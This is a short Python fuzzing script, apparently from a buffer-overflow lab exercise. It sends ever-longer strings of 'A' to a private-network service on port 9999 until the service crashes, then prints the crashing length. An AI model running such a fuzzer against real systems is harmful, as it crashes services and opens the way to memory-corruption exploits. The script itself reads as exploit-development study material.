#!/usr/bin/python3

import sys, socket
from time import sleep


buffer = "A" * 100
#username="Jorge"

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.81.130',9999))
        s.recv(1024)
        #s.send(bytes(username + "\r\n","latin-1"))
        #sleep(1)
        #payload = "OVERFLOW7 " + buffer
        payload = buffer

        print("Fuzzing with {} bytes".format(len(buffer)))
        s.send(bytes(payload + "\r\n","latin-1"))
        sleep(1)
        s.recv(1024)
        buffer = buffer + "A" * 100
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
